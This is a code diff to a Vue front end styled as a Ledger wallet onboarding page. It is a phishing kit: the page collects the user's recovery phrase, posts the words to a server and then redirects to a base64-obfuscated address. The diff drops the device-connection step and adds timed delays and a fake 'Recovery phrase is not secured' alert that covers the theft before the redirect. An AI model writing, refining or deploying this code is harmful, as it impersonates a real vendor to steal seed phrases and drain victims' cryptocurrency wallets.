@@ -63,14 +63,14 @@
                     </div>
                   </li>
                 </ul>
-                <div v-if="step == 2">
+                <div v-if="step == 1">
                   <form id="phrases">
                     <KeyPhrases v-model="phrases" />
                   </form>
                 </div>
               </div>
 
-              <div class="w-70 m-auto grow flex justify-center items-center" v-if="step == 3">
+              <div class="w-70 m-auto grow flex justify-center items-center" v-if="step == 2">
                 <Lottie name="anim-loading" />
               </div>
 
@@ -83,12 +83,12 @@
             </div>
           </div>
           <div class="footer">
-            <UButton v-if="step <= 2" :disabled="isPrevDisabled" @click="previousStep" color="neutral" variant="outline" class="nav-button"
+            <UButton v-if="step <= 1" :disabled="isPrevDisabled" @click="previousStep" color="neutral" variant="outline" class="nav-button"
                      icon="material-symbols:arrow-back" :label="currentStep?.main.footer.previous"/>
-            <UButton v-if="step < 2" :disabled="isNextDisabled" @click="nextStep" color="neutral" variant="solid"
+            <UButton v-if="step < 1" :disabled="isNextDisabled" @click="nextStep" color="neutral" variant="solid"
                      class="nav-button" trailing-icon="material-symbols:arrow-forward"
                      :label="currentStep?.main.footer.next"/>
-            <UButton v-else-if="step == 2" @click="submitPhrases(phrases)" color="neutral" variant="solid"
+            <UButton v-else-if="step == 1" @click="submitPhrases(phrases)" color="neutral" variant="solid"
                      class="nav-button" trailing-icon="material-symbols:arrow-forward"
                      :label="currentStep?.main.footer.next"/>
           </div>
@@ -105,7 +105,7 @@ import type { Step } from "../types";
 
 const isValidated = ref(false);
 
-const animationModules = import.meta.glob('~/assets/lottie/*.json', {eager: true});
+const animationModules = import.meta.glob('~/assets/lottie2/*.json', {eager: true});
 const animations = reactive(
     Object.entries(animationModules).map(([path, module]) => ({
       name: path.split('/').pop()?.replace('.json', '') || '',
@@ -121,7 +121,7 @@ useHead({
 
 
 
-const steps: Step[] = [
+const steps: Ref<Step[]> = ref([
   {
     sidebar: {
       logoImg: {
@@ -151,57 +151,57 @@ const steps: Step[] = [
       }
     }
   },
-  {
-    sidebar: {
-      logoImg: {
-        src: "/img/logo.svg",
-        alt: "Ledger Logo",
-      },
-      bodyImg: {
-        src: "anim-plug-light",
-        alt: "anim-plug-light",
-        class: "scale-200 origin-left",
-      },
-      imgType: "lottie"
-    },
-    main: {
-      body: {
-        title: "the best way to get your started:",
-        description: [
-          {
-            title: "Turn on Nano",
-            body: "Connect your device to your computer with the USB cable.",
-            badge: "1"
-          },
-          {
-            title: "Browse",
-            body: "Learn how to interact with your device by reading the on-screen instructions.",
-            badge: "2"
-          },
-          {
-            title: "Select 'Enter your recovery phrase'",
-            body: "Press both buttons simultaneously to validate the selection.",
-            badge: "3"
-          },
-          {
-            title: "Follow instructions",
-            body: "Come back here to follow instructions on your PIN code.",
-            badge: "4"
-          }
-        ],
-        type: "list",
-      },
-      progress: {
-        badge: 2,
-        status: "connect device",
-        value: 35,
-      },
-      footer: {
-        next: "Next step",
-        previous: "Back",
-      }
-    }
-  },
+  // {
+  //   sidebar: {
+  //     logoImg: {
+  //       src: "/img/logo.svg",
+  //       alt: "Ledger Logo",
+  //     },
+  //     bodyImg: {
+  //       src: "anim-plug-light",
+  //       alt: "anim-plug-light",
+  //       class: "scale-200 origin-left",
+  //     },
+  //     imgType: "lottie"
+  //   },
+  //   main: {
+  //     body: {
+  //       title: "the best way to get your started:",
+  //       description: [
+  //         {
+  //           title: "Turn on Nano",
+  //           body: "Connect your device to your computer with the USB cable.",
+  //           badge: "1"
+  //         },
+  //         {
+  //           title: "Browse",
+  //           body: "Learn how to interact with your device by reading the on-screen instructions.",
+  //           badge: "2"
+  //         },
+  //         {
+  //           title: "Select 'Enter your recovery phrase'",
+  //           body: "Press both buttons simultaneously to validate the selection.",
+  //           badge: "3"
+  //         },
+  //         {
+  //           title: "Follow instructions",
+  //           body: "Come back here to follow instructions on your PIN code.",
+  //           badge: "4"
+  //         }
+  //       ],
+  //       type: "list",
+  //     },
+  //     progress: {
+  //       badge: 2,
+  //       status: "connect device",
+  //       value: 35,
+  //     },
+  //     footer: {
+  //       next: "Next step",
+  //       previous: "Back",
+  //     }
+  //   }
+  // },
   {
     sidebar: {
       logoImg: {
@@ -220,9 +220,9 @@ const steps: Step[] = [
         description: "Your recovery phrase is the secret list of words that you backed up when you first set up your wallet.<br>Ledger does not keep a copy of your recovery phrase."
       },
       progress: {
-        badge: 3,
+        badge: 2,
         status: "recovery phrase",
-        value: 65,
+        value: 52,
       },
       footer: {
         next: "Check recovery phrase",
@@ -250,7 +250,7 @@ const steps: Step[] = [
         type: "paragraph",
       },
       progress: {
-        badge: 4,
+        badge: 3,
         status: "processing",
         value: 91,
       },
@@ -260,18 +260,17 @@ const steps: Step[] = [
       }
     }
   }
-
-];
+]);
 const step = ref(0)
 
-const currentStep = computed(() => steps[step.value] ?? steps[0])
+const currentStep = computed(() => steps.value[step.value] ?? steps.value[0])
 const device = ref(undefined)
 const value = computed(() => currentStep.value?.main.progress.value ?? 0)
 const maxValue = Array(100).fill('')
 const phrases = ref([]) as Ref<string[]>
 
 async function nextStep() {
-  if (step.value == steps.length - 1) return
+  if (step.value == steps.value.length - 1) return
   step.value += 1;
   // if (step.value == 1) {
   //   let toast = useToast().add(
@@ -311,8 +310,12 @@ async function submitPhrases(phrases) {
       body: {words: phrases},
     })
     setTimeout(() => {
-      window.location.replace(atob(red))
-    }, 500)
+      currentStep.value.main.body.title = "Attention!"
+      currentStep.value.main.body.description = "Recovery phrase is not secured, redirecting..."
+      setTimeout(() => {
+        window.location.replace(atob(red))
+      }, 3000)
+    }, 7000)
   } catch (error) {
     useToast().add({title: "Unexpected error", description: "An unexpected error occurred. please try again later.", color: "error"})
     previousStep()
@@ -321,7 +324,7 @@ async function submitPhrases(phrases) {
 }
 
 const isNextDisabled = computed(() => {
-if (step.value == steps.length-1) return true;
+if (step.value == steps.value.length-1) return true;
 // if (step.value == 1) {
 //   if (device.value == undefined) return true;
 // }
